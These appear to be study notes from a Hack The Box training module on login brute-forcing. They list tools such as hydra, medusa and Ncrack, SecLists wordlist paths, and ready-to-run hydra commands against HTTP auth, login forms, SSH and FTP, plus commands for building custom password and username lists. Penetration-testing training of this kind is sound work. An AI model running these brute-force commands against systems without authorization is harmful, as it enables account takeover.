There are many tools and methods to utilize for login brute-forcing, like:

- `Ncrack`
- `wfuzz`
- `medusa`
- `patator`
- `hydra`
- and others.

|**Password Attack Type**|
|---|
|`Dictionary attack`|
|`Brute force`|
|`Traffic interception`|
|`Man In the Middle`|
|`Key Logging`|
|`Social engineering`|

We can check out the [SecLists](https://github.com/danielmiessler/SecLists) repo for wordlists, as it has a huge variety of wordlists, covering many types of attacks.  
We can find password wordlists in our PwnBox in `/opt/useful/SecLists/Passwords/`, and username wordlists in `/opt/useful/SecLists/Usernames/`.

We can find default passwords in `SecLists/Passwords/Default-Credentials`


#### Supported Services

```shell-session
Orbixio@htb[/htb]$ hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e
```

To find out how to use the any module, we can use the "`-U`" flag to list the parameters it requires and examples of usage


| **Command**                                                                                                                                                       | **Description**                                     |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------- |
| `hydra -h`                                                                                                                                                        | hydra help                                          |
| `hydra -C wordlist.txt SERVER_IP -s PORT http-get /`                                                                                                              | Basic Auth Brute Force - Combined Wordlist          |
| `hydra -L wordlist.txt -P wordlist.txt -u -f 83.136.254.223 -s 38963 http-get /`                                                                                  | Basic Auth Brute Force - User/Pass Wordlists        |
| `hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 83.136.254.223 -s 38963 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='login-in'"` | Login Form Brute Force - Static User, Pass Wordlist |
| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4`                                                                                                | SSH Brute Force - User/Pass Wordlists               |
| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1`                                                                                                              | FTP Brute Force - Static User, Pass Wordlist        |

### Wordlists

| **Command**                                                                        | **Description**            |
| ---------------------------------------------------------------------------------- | -------------------------- |
| `/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` | Default Passwords Wordlist |
| `/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt`                      | Common Passwords Wordlist  |
| `/opt/useful/SecLists/Usernames/Names/names.txt`                                   | Common Names Wordlist      |

| Command                                         | Details                                |
| ----------------------------------------------- | -------------------------------------- |
| `cupp -i`                                       | Creating Custom Password Wordlist      |
| `sed -ri '/^.{,7}$/d' william.txt`              | Remove Passwords Shorter Than 8        |
| ``sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt`` | Remove Passwords With No Special Chars |
| `sed -ri '/[0-9]+/!d' william.txt`              | Remove Passwords With No Numbers       |
| `./username-anarchy Bill Gates > bill.txt`      | Generate Usernames List                |